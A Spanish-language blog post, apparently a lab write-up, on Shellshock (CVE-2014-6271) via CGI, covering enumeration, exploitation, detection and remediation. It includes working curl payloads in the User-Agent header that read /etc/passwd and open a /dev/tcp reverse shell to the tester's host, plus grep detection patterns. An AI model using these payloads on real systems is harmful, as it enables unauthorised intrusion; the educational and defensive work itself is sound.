@@ -1,0 +1,465 @@
+---
+layout: post
+title: Shellshock vía CGI
+date: 2026-01-17 10:00:00 +0100
+description: "Guía práctica para identificar y validar Shellshock vía CGI, demostrando RCE desde HTTP y medidas de mitigación."
+excerpt: 'CGI expone un patrón peligroso: entrada HTTP que termina en RCE desde HTTP.'
+
+category: guias
+category_label: Guías
+primary_category_anchor: guias
+categories:
+  - guias
+kicker: "guias"
+
+tags:
+- shellshock
+- cgi
+
+reading_time: "6 min de lectura"
+
+level: intermedio
+
+featured: true
+featured_badge: "Writeup"
+featured_lines:  
+  - "GET /api/v2/suppliers/all"
+  - "POST /api/v2/authentication/"
+  - "ffuf -w emails.txt:EMAIL"
+
+cover_badge: "WriteUps"
+cover_lines:
+  - "GET /api/v2/suppliers/all"
+  - "POST /api/v2/authentication/"
+  - "ffuf -w emails.txt:EMAIL"
+cover_image: /assets/img/blog/Shellshock-via-CGI/cover.png
+
+slug: shellshock-via-cgi
+
+permalink: /blog/guias/shellshock-via-cgi.html
+
+toc_html: |
+  <a href="#cgi-como-superficie-heredada">CGI como superficie heredada</a>
+  <a href="#ataques-cgi-el-caso-canonico">Ataques CGI: el caso canónico</a>
+  <a href="#ejemplo-practico">Ejemplo práctico</a>
+  <a href="#que-esta-pasando-realmente-cgi-entorno-bash">Qué está pasando realmente (CGI → entorno → Bash)</a>
+  <a href="#evidencia-y-alcance-del-hallazgo">Evidencia y alcance del hallazgo</a>
+  <a href="#deteccion-indicadores-en-logs">Detección: indicadores en logs</a>
+  <a href="#remediacion-priorizada">Remediación (priorizada)</a>
+  <a href="#referencias">Referencias</a>
+---
+
+<p>El <strong>Common Gateway Interface (CGI)</strong> es un mecanismo clásico para que un servidor web ejecute <strong>scripts o programas externos</strong> y genere respuestas dinámicas.</p>
+<p>En despliegues tradicionales, estos scripts residen en rutas tipo <code>/cgi-bin</code> y pueden estar escritos en múltiples lenguajes (C, C++, Java, Perl, etc.). El servidor recibe una petición a una URL bajo esa ruta, ejecuta el script y devuelve al navegador la salida del programa.</p>
+<p>El detalle relevante para seguridad no es “CGI como tecnología”, sino el <strong>modelo de ejecución</strong>: los scripts se ejecutan con el <strong>contexto de seguridad del servidor web</strong> (típicamente un usuario como <code>www-data</code>) y, por diseño, muchos datos de la petición (cabeceras, parámetros) acaban transformándose en <strong>variables de entorno</strong> accesibles por el proceso que se lanza.</p>
+<h2 id="cgi-como-superficie-heredada">CGI como superficie heredada</h2>
+<p>CGI tiene limitaciones operativas conocidas: <strong>un proceso nuevo por cada petición</strong>, conexiones recurrentes a base de datos, ausencia de caché entre cargas y pérdida de eficiencia a medida que crece el tráfico. Por eso, en aplicaciones modernas fue reemplazado por tecnologías más rápidas y seguras. Aun así, sigue apareciendo en <strong>sistemas legacy</strong> y, con frecuencia, en <strong>dispositivos embebidos</strong> o paneles web antiguos.</p>
+<h2 id="ataques-cgi-el-caso-canonico">Ataques CGI: el caso canónico</h2>
+<p>El ataque más emblemático asociado a CGI es <strong>Shellshock</strong> (también conocido como “Bash bug”), catalogado principalmente como <strong>CVE-2014-6271</strong>. El problema afecta a versiones antiguas de <strong>GNU Bash</strong> (hasta 4.3) y permite <strong>ejecutar comandos</strong> cuando Bash importa ciertas definiciones desde <strong>variables de entorno</strong>.</p>
+<p>En términos prácticos, Shellshock convierte un patrón muy concreto en RCE:</p>
+<ul>
+<li>Entrada no confiable (HTTP u otros canales)</li>
+<li>Conversión de esa entrada a variables de entorno (típico en CGI)</li>
+<li>Ejecución de Bash (directa o indirecta) dentro del flujo del script</li>
+</ul>
+<p>Cuando esa cadena existe, un atacante puede construir valores de entorno que, al ser procesados por Bash vulnerable, desencadenan ejecución de comandos en el contexto del usuario del servidor web. En la mayoría de escenarios el primer acceso queda en un usuario de servicio y la escalada de privilegios es un paso posterior; en configuraciones erróneas, el impacto puede ser mayor si el servicio corre con privilegios elevados.</p>
+<p>En sistemas parcheados, este comportamiento se elimina: Bash deja de ejecutar contenido “extra” al importar funciones desde el entorno y endurece el formato de dichas definiciones.</p>
+<h2 id="ejemplo-practico">Ejemplo práctico</h2>
+<p>En esta demostracion enumerare una maquina, explotare una vulnerabilidad de Shellshock.</p>
+<p>Objetivo: 10.129.205.27</p>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>$ ping -c2 10.129.205.27
+PING 10.129.205.27 (10.129.205.27) 56(84) bytes of data.
+64 bytes from 10.129.205.27: icmp_seq=1 ttl=63 time=49.2 ms
+64 bytes from 10.129.205.27: icmp_seq=2 ttl=63 time=49.2 ms
+
+--- 10.129.205.27 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1000ms
+rtt min/avg/max/mdev = 49.208/49.208/49.209/0.000 ms
+</code></pre>
+    </div>
+  </div>
+
+<p>Escaneo el objetivo usando <code>nmap</code>, para identificar los servicios activos que operan actualmente en el sistema.</p>
+<p>Esto me dará información valiosa sobre el objetivo, descubriendo qué servicios y potencialmente qué versiones específicas se están ejecutando y en consecuencia me dará una mejor comprensión de su infraestructura y sus posibles vulnerabilidades.</p>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>nmap -p- -sC -Pn 10.129.205.27 --open 
+</code></pre>
+    </div>
+  </div>
+
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>nmap -p- -sC -Pn 10.129.205.27 --open 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-17 02:59 CST
+Nmap scan report for 10.129.205.27
+Host is up (0.051s latency).
+Not shown: 64378 closed tcp ports (reset), 1155 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh-hostkey: 
+|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
+|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
+|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
+80/tcp open  http
+|_http-title: Apache2 Ubuntu Default Page: It works
+
+Nmap done: 1 IP address (1 host up) scanned in 25.74 seconds
+</code></pre>
+    </div>
+  </div>
+
+<p>Me da un servicio de ssh y un servicio http que ademas me muestra que tiene Apache2 corriendo.</p>
+<p>Compruebo visualmente el acceso via web.</p>
+<p><img alt="alt text" src="\assets\img\blog\shellshock-via-cgi\image.png"/></p>
+<p>Realizo una enumeracion basica en el servidor</p>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>gobuster dir -u http://10.129.205.27 -w /usr/share/wordlists/dirb/small.txt
+</code></pre>
+    </div>
+  </div>
+
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>gobuster dir -u http://10.129.205.27 -w /usr/share/wordlists/dirb/small.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.205.27
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/cgi-bin/             (Status: 403) [Size: 278]
+Progress: 959 / 960 (99.90%)
+===============================================================
+Finished
+===============================================================
+</code></pre>
+    </div>
+  </div>
+
+<p>Busco scripts CGI.</p>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+</code></pre>
+    </div>
+  </div>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.205.27/cgi-bin/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              cgi
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/access.cgi           (Status: 200) [Size: 0]
+Progress: 1918 / 1920 (99.90%)
+===============================================================
+Finished
+===============================================================
+
+</code></pre>
+    </div>
+  </div>
+
+<p>Encuentro un scripts CGI, <code>access.cgi</code>.</p>
+<p>ejecuto cURL en el script y notar que no se nos muestra nada, por lo que tal vez sea un script obsoleto pero aún así vale la pena explorarlo más a fondo.</p>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>curl -i http://10.129.205.27/cgi-bin/access.cgi
+</code></pre>
+    </div>
+  </div>
+
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>curl -i http://10.129.205.27/cgi-bin/access.cgi
+HTTP/1.1 200 OK
+Date: Sat, 17 Jan 2026 09:04:37 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Length: 0
+Content-Type: text/html
+</code></pre>
+    </div>
+  </div>
+
+<p>A continuacion voy a intentar confirmar la vulnerabilidad</p>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
+</code></pre>
+    </div>
+  </div>
+
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+</code></pre>
+    </div>
+  </div>
+
+<p>La respuesta me ha devuelto el contenido del fichero passwd del servidor.</p>
+<p>Una vez confirmada la vulnerabilidad, puedo obtener acceso inverso al shell de muchas maneras. En este caso voy a utilizar una linea de bash en la que usare netcat para obtener la shell.</p>
+<p>Levanto el oyente de netcat para cualquier comunicacion contra mi IP en el puerto 7777</p>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>sudo nc -lvnp 7777
+listening on [any] 7777 ...
+
+</code></pre>
+    </div>
+  </div>
+
+<p>Lanzo el ataque</p>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>curl -H 'User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.58/7777 0&gt;&amp;1' http://10.129.205.27/cgi-bin/access.cgi
+</code></pre>
+    </div>
+  </div>
+
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>sudo nc -lvnp 7777
+listening on [any] 7777 ...
+connect to [10.10.14.58] from (UNKNOWN) [10.129.205.27] 45158
+bash: cannot set terminal process group (962): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@htb:/usr/lib/cgi-bin$ 
+
+</code></pre>
+    </div>
+  </div>
+
+<p>Compruebo que mi entorno en el servidor</p>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>www-data@htb:/usr/lib/cgi-bin$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@htb:/usr/lib/cgi-bin$ whoami
+whoami
+www-data
+www-data@htb:/usr/lib/cgi-bin$ ls
+ls
+access.cgi
+flag.txt
+</code></pre>
+    </div>
+  </div>
+
+<p>Esto demuestra que el endpoint CGI permite <strong>ejecución de comandos</strong> al procesar una cabecera HTTP que termina convertida en variable de entorno y que, a su vez, es interpretada por una versión vulnerable de <strong>Bash</strong>. El impacto práctico es <strong>RCE en el contexto del servicio web</strong>, que en este caso es <code>www-data</code>.</p>
+<h2 id="que-esta-pasando-realmente-cgi-entorno-bash">Qué está pasando realmente (CGI → entorno → Bash)</h2>
+<p>En entornos CGI, Apache expone información de la petición como variables de entorno del proceso. Por ejemplo, la cabecera <code>User-Agent</code> suele mapearse a una variable tipo <code>HTTP_USER_AGENT</code>. Si el script CGI (o cualquier wrapper en su ejecución) invoca Bash y el sistema está afectado por Shellshock, Bash reinterpreta ciertos valores del entorno como definiciones de función y, en versiones vulnerables, ejecuta contenido adicional.</p>
+<p>Cadena de riesgo:</p>
+<ol>
+<li>Cabecera/entrada controlable por el cliente</li>
+<li>CGI la convierte en variable de entorno</li>
+<li>El flujo del CGI termina invocando Bash</li>
+<li>Bash vulnerable ejecuta comandos</li>
+</ol>
+<h2 id="evidencia-y-alcance-del-hallazgo">Evidencia y alcance del hallazgo</h2>
+<p><strong>Evidencia mínima (reproducible):</strong></p>
+<ul>
+<li>URL vulnerable: <code>/cgi-bin/access.cgi</code></li>
+<li>Vector: cabecera <code>User-Agent</code></li>
+<li>Resultado: ejecución de comandos como <code>www-data</code> (confirmado por <code>id/whoami</code> en la sesión obtenida)</li>
+</ul>
+<p><strong>Alcance realista:</strong></p>
+<ul>
+<li>Compromiso del servidor web desde HTTP si <code>/cgi-bin</code> es accesible y hay scripts CGI ejecutables.</li>
+<li>El acceso inicial suele quedar en usuario de servicio; la criticidad depende de controles adicionales (permisos, segmentación, credenciales expuestas, etc.).</li>
+</ul>
+<h2 id="deteccion-indicadores-en-logs">Detección: indicadores en logs</h2>
+<p>En muchos casos quedan huellas claras en logs de acceso HTTP. Indicadores típicos:</p>
+<ul>
+<li>Presencia de patrones como <code>() {</code> en <code>User-Agent</code> u otras cabeceras.</li>
+<li>Cadenas con <code>BASH_FUNC_</code> (en intentos contra sistemas parcialmente parcheados o por variaciones del payload).</li>
+<li>Picos de peticiones a <code>/cgi-bin/</code> seguidos de respuestas anómalas.</li>
+</ul>
+<p>Ejemplos de búsquedas defensivas (servidor):</p>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code># Apache access logs (rutas comunes)
+grep -R --line-number -E '\(\)\s*\{|BASH_FUNC_|cgi-bin' /var/log/apache2/ 2&gt;/dev/null
+
+# Filtro más específico: Shellshock clásico
+grep -R --line-number -E '\(\)\s*\{\s*:;\s*\}' /var/log/apache2/ 2&gt;/dev/null
+</code></pre>
+    </div>
+  </div>
+
+<p>Si hay SIEM, la firma base es: User-Agent contiene () { y el request toca rutas CGI o endpoints legacy.</p>
+<h2 id="remediacion-priorizada">Remediación (priorizada)</h2>
+<h3>Parcheo de Bash</h3>
+<ul>
+<li>Actualizar Bash a una versión corregida por el proveedor.</li>
+<li>Verificar que no se aplicó solo el parche inicial histórico (familia Shellshock tuvo bypasses).</li>
+<li>Eliminar o reducir superficie CGI</li>
+<li>Deshabilitar CGI si no es imprescindible.</li>
+<li>Restringir ScriptAlias y permisos de ejecución en /cgi-bin a lo estrictamente necesario.</li>
+<li>Revisar scripts heredados: evitar invocaciones innecesarias a Bash y sanitizar entradas.</li>
+</ul>
+<h3>Controles compensatorios</h3>
+<ul>
+<li>Segmentación y reducción de exposición externa del servidor.</li>
+<li>WAF/Reverse proxy con reglas específicas para bloquear patrones conocidos (como () { en cabeceras), como mitigación temporal mientras se parchea.</li>
+</ul>
+<h2 id="referencias">Referencias</h2>
+<p>CVE-2014-6271 (Shellshock)</p>
